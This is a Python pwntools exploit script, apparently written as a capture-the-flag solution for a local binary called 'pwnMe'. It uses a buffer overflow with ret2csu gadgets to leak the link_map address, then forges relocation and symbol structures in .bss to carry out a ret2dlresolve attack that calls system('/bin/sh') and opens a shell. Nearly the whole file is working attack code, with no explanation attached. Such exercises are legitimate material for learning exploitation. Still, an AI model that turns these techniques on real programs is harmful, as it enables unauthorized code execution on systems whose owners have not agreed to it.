leave_ret = 0x401179
ret = 0x40101a
prdi_ret = 0x401213
prsi_r15_ret = 0x401211

# write to leak linkmap addr write(1, addr_got+8, 8)
POP_chain = 0x40120a # pop rbx, rbp, r12, r13, r14, r15, ret
REG_call = 0x4011f0	 # rdx<-r14, rsi<-r13, edi<-r12d, call [r15 + rbx*8]

write_plt = 0x401050
write_got = 0x404018
read_plt = 0x401060
read_got = 0x404020
main_addr = 0x40117b
vuln_addr = 0x401156

got_addr = 0x404000
plt_addr = 0x401020	# x86_64 plt[0] is resolver 

def ret2csu(rbx, rbp, r12, r13, r14, r15): # size 48
	payload = ""
	payload += p64(rbx)
	payload += p64(rbp)
	payload += p64(r12)
	payload += p64(r13)
	payload += p64(r14)
	payload += p64(r15)
	return payload

from pwn import *

elf = ELF("./pwnMe")
p = elf.process()
gdb.attach(p)

resolver = 0x401020
bss = 0x404900
x = 1

STRTAB = 0x400438
SYMTAB = 0x4003c0
JMPREL = 0x4004d8

padding = "A" * 0x40 # don't have rbp

buf1 = padding + "A" * 8
buf1 += p64(POP_chain)
buf1 += ret2csu(0, 1, 1, got_addr + 8, 8, write_got)
buf1 += p64(REG_call)
buf1 += "A" * 8
buf1 += ret2csu(0, 1, 0, bss, 0x400, read_got)
buf1 += p64(REG_call)
buf1 += "A" * 8
buf1 += "A" * 8
buf1 += p64(bss)
buf1 += "A" * 8
buf1 += "A" * 8
buf1 += "A" * 8
buf1 += "A" * 8
buf1 += p64(leave_ret)


p.recv(10) # Hello ROP
p.send(buf1)

# Get address of addr_dt_versym
leak = p.recv(8)

addr_link_map = hex(u64(leak))
addr_link_map = int(addr_link_map, 16)
log.info("Addr link_map: " + hex(addr_link_map))	

addr_dt_versym = addr_link_map + 0x1d0	# 0x1c8
log.info("Addr dt_versym: " + hex(addr_dt_versym))

# fake Info
forged_area = bss + 0x100
addr_rela = forged_area
align_rela = 24 - ((addr_rela - JMPREL) % 24)
addr_rela = addr_rela + align_rela

addr_sym = addr_rela + 24
align_sym = 24 - ((addr_sym - SYMTAB) % 24)
addr_sym = addr_sym + align_sym

addr_name_sym = addr_sym + 24

rela_offset = (addr_rela - JMPREL) // 24	# fake rela_offset
index_sym = (addr_sym - SYMTAB) // 24
r_info = (index_sym << 32) | 0x7			# fake r_info
st_name = addr_name_sym - STRTAB			# fake st_name

# fake Struct 
fake_rela_struct =  p64(read_got) + p64(r_info) + p64(0)

fake_sym_struct = p32(st_name) + p32(0x12) + p64(0) + p64(0)

# payload 2 in bss
fake = ""
fake = "AAAAAAAA"
fake += p64(POP_chain)
fake += ret2csu(0, 1, 0, addr_dt_versym, 0x8, read_got)
fake += p64(REG_call)
fake += "AAAAAAAA"
fake += ret2csu(0, 0, 0, 0, 0, 0)
fake += p64(prsi_r15_ret)
fake += p64(0)
fake += p64(0)
fake += p64(prdi_ret)
fake += p64(bss + 0x200)	# "/bin/sh"
fake += p64(resolver)
fake += p64(rela_offset)

length = 0x100 - len(fake)
fake += "A" * length

# fake struct | bss + 0x100
fake += "A" * align_rela
fake += fake_rela_struct
fake += "A" * align_sym
fake += fake_sym_struct
fake += "system\x00\x00"

length = 0x200 - len(fake)
fake += "A" * length

fake += "/bin/sh\x00"

sleep(x)
p.send(fake)
sleep(x)
p.send(p64(0))

p.interactive()










